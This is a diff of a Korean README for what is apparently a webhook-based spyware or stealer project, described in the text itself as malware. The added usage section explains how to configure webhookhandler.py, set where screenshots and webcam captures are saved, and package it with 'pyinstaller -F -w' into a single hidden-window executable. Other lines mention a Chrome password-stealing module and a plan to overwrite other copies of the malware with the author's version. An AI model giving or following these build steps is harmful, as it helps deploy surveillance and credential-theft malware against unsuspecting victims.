@@ -30,3 +30,15 @@
 그리고 이것도 추후 추가될예정이자만 서로다른 버전(혹은 서로다른 웹훅링크)의 악성코드가 발견될경우 먼저있던 악성코드를 자신의 버전으로 업그레이드 시키는 기술도 구현할것입니다.
 
 chromepass* : 현재 chromepass가 막혀서 기다려봐야할거 같습니다.
+
+## 사용법
+
+webhookhandler.py 안에있는 모든 변수를 수정한뒤
+
+filenameforexe : pyinstaller로 .exe파일로 만들었을때 그파일의 이름 ex) example.exe
+
+path : 스크린샷 캠샷 등이 저장될 경로 ex)example,image,Data... 등등
+
+'''
+pyinstaller -F -w webhookhandler.py
+'''
